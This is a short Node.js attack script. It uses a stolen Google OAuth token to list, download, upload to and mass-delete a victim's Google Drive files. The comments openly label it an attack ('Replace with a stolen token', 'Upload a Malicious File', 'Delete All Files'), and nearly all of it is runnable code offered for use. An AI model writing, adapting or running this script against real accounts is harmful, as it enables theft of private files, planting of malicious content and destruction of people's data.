const fetch = require("node-fetch");

// âœ… Set your stolen OAuth token
const OAUTH_TOKEN = "ya29.a0AfH6SMBp...";  // Replace with a stolen token

// âœ… List All Google Drive Files
async function listDriveFiles() {
    let response = await fetch("https://www.googleapis.com/drive/v3/files", {
        headers: { Authorization: `Bearer ${OAUTH_TOKEN}` }
    });
    let data = await response.json();
    console.log("Victim's Files:", data);
}

// âœ… Download a Specific File from Google Drive
async function downloadFile(fileId) {
    let response = await fetch(`https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`, {
        headers: { Authorization: `Bearer ${OAUTH_TOKEN}` }
    });
    let fileData = await response.text();
    console.log("Downloaded File Data:", fileData);
}

// âœ… Upload a Malicious File to Victimâ€™s Google Drive
async function uploadFile() {
    let fileData = new Blob(["Malicious Payload"], { type: "text/plain" });

    let response = await fetch("https://www.googleapis.com/upload/drive/v3/files?uploadType=media", {
        method: "POST",
        headers: { Authorization: `Bearer ${OAUTH_TOKEN}` },
        body: fileData
    });

    let result = await response.json();
    console.log("Malicious file uploaded:", result);
}

// âœ… Delete All Files from Google Drive
async function deleteAllFiles() {
    let response = await fetch("https://www.googleapis.com/drive/v3/files", {
        headers: { Authorization: `Bearer ${OAUTH_TOKEN}` }
    });
    let files = await response.json();

    for (let file of files.files) {
        await fetch(`https://www.googleapis.com/drive/v3/files/${file.id}`, {
            method: "DELETE",
            headers: { Authorization: `Bearer ${OAUTH_TOKEN}` }
        });
        console.log(`Deleted: ${file.name}`);
    }
}

// ðŸš€ Run Attack Functions
(async () => {
    await listDriveFiles();
    // await downloadFile("FILE_ID_HERE"); // Replace with actual File ID
    // await uploadFile();
    // await deleteAllFiles();
})();
